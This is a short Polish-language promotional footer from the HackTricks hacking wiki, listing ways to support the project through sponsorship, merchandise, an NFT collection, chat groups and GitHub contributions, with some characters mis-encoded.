Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **na GitHubie.**

</details>
